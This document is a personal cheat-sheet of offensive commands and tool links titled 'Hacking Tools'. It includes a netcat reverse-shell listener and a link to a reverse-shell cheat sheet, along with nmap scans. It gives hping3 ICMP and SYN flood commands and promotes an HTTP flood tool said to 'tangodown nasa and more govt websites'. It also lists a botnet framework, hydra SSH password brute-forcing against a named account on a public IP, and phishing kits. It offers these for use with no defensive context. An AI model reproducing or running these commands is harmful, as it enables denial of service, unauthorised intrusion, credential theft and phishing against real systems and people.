---
slug: Linux Fundamentals
id: hacking-tools
title: Hacking Tools
authors: [vnk]
tags: [Linux, OS]
custom_edit_url: null
---

### Reverse Shell
	- Netcat
		- Command in linux - nc
		- nc -lnvp 87 -s 49.37.145.46
			l: Listen
			n: ip addresses only
			v: verbose
			p: port

	- Github link - PayloadsAllTheThings - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

****************************************************************************

### nMAP - Network Mapper
1) To check all the host up and running
```
$ nmap -sP 10.7.1.0/24
```
2) command - nmap -sT -p 80,443 10.7.1.0/24 - to check the host running port 80, 443 typically websites will be running on that port
	- Stealthy mode: nmap -sS -p 80,443 10.7.1.0/24
3) sudo nmap -O 10.7.1.226
	- ping
	- what ports are up
	- whats the OS and more
4) sudo nmap --script vuln 10.7.1.226

****************************************************************************

### DDos Attack
	1) Low Orbit Ion Cannon
	2) Ping ICMP flood
		- sudo hping3 -1 --flood 10.7.1.50
	3) SYN Flood Attack
		- Any TCP Connection has 3 way handshake
			  i) SYN - CLIENT
			 ii) SYN ACK - SERVER
			iii) ACK - CLIENT
		- sudo hping3 -d 200 -p 80 -S --flood 10.7.1.50

### iDDos
	1) Saphyra - iDDos Priv8 Tool

		The iDDos Protocol is the most massive type of attack
		This tool can tangodown nasa and more govt websites

		This is a HTTP Flood attack (Will send ton of HTTP Get requests)
		LINK - https://github.com/laorynas/Saphyra
		command - python saphyra.py http://10.7.1.50

### BOTNET
BYOB botnet framework
- https://byob.dev/
- https://github.com/malwaredllc/byob
*****************************************************************************

### Password Hacking
1) hydra
```diff
$ sudo hydra -L usernames.txt
$ sudo hydra -l "dwilight.schrute" - P wordlist.txt 45.79.49.74 ssh
```

2) hashcat
- This is to covert the plain pwd to hash and then match with the hash pwd saved on the system

*****************************************************************************
### DARK WEB
1) Dashlane
2) Install tor on vm
```
$ sudo apt install tor
$ nano /etc/tor/torrc
		- uncomment hidden services directory and ip address
		- sudo service tor status/start/stop
$ cat /var/lib/tor/hidden_service/hostname (is where you will get the address)
```
*******************************************************************************
### Phishing
1) blackeye
 - https://github.com/htr-tech/nexphisher  
2) Social engineering tool kit - SET on kali linux  
3) DNS poisoning - Always the host files is checked before hitting the DNS server
*******************************************************************************

### Instagram Hacking
1) datalux/Osintgram
	- https://github.com/Datalux/Osintgram
*******************************************************************************

### Twitter Hacking 
	1) Twint - Twitter Intelligence
		- https://github.com/twintproject/twint
********************************************************************************

Find Social media accounts with SHERLOCK
	1) https://github.com/sherlock-project/sherlock
********************************************************************************

Proxy Chains
	1) command - locate proxychains
		- /etc/proxychains.conf
********************************************************************************

sharkjack-payloads
	- https://github.com/hak5/sharkjack-payloads